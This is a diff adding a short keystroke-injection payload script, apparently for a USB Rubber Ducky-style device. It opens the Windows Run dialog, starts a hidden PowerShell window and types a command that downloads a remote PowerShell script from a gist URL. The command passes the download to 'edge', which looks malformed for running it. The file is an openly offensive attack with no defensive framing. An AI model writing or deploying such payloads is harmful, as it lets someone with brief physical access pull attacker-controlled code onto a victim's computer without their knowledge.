@@ -1,0 +1,8 @@
+DELAY 500
+GUI r
+DELAY 350
+STRING powershell -WindowStyle Hidden
+ENTER
+DELAY 300
+STRING edge ((New-Object System.Net.Webclient).DownloadString('https://gist.github.com/highdeftant/eggDrop.ps1'))
+ENTER
